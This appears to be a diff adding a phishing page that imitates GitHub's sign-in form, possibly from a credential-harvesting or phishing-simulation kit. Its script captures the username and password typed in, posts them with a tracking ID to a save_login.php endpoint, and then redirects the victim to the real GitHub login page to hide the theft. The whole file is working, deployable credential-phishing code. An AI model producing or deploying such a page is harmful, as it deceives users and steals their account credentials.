@@ -1,0 +1,44 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in to GitHub · GitHub</title><style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;background:#f6f8fa;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:32px 16px}
+.gh-logo{color:#24292f;font-size:48px;font-weight:700;margin-bottom:24px;letter-spacing:-2px}
+.card{background:#f6f8fa;border:1px solid #d0d7de;border-radius:6px;padding:20px;width:100%;max-width:308px}
+.label{display:block;font-size:14px;font-weight:400;margin-bottom:8px;color:#24292f}
+input{width:100%;height:32px;border:1px solid #d0d7de;border-radius:6px;padding:5px 12px;font-size:14px;margin-bottom:16px;background:#fff}
+input:focus{border-color:#0969da;outline:none;box-shadow:0 0 0 3px rgba(9,105,218,.15)}
+.btn-submit{width:100%;height:32px;background:#24292f;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:500;cursor:pointer}
+.btn-submit:hover{background:#1a1e22}
+.sub{font-size:12px;color:#57606a;margin-top:16px;text-align:center}
+</style></head><body><div class="gh-logo">GitHub</div><div class="card"><form id="loginForm"><label class="label" for="email">Username or email address</label><input type="text" id="email" required autocomplete="username"><label class="label" for="password">Password</label><input type="password" id="password" required autocomplete="current-password"><button type="submit" class="btn-submit">Sign in</button></form><p class="sub">Authenticate to continue to GitHub</p></div><script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<script>
+(function(){
+var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, "") || "/");
+document.getElementById("loginForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+    var login = document.getElementById("email").value;
+    var password = document.getElementById("password").value;
+    var tid = typeof window.TRACKIFY_TID === "string" ? window.TRACKIFY_TID : (new URLSearchParams(window.location.search).get("tid") || "");
+    var btn = document.querySelector(".btn-submit");
+    var label = btn.textContent;
+    btn.textContent = "Please wait…";
+    btn.disabled = true;
+    $.ajax({
+        type: "POST",
+        url: BASE_URL + "save_login.php",
+        data: { tid: tid, login: login, password: password, template: "github" },
+        dataType: "json",
+        success: function (data) {
+            if (data && data.ok) { window.location.href = "https:\/\/github.com\/login"; return; }
+            btn.textContent = label;
+            btn.disabled = false;
+            alert("Sign in failed. Please try again.");
+        },
+        error: function () {
+            btn.textContent = label;
+            btn.disabled = false;
+            alert("Sign in failed. Please try again.");
+        }
+    });
+});
+})();
+</script></body></html>
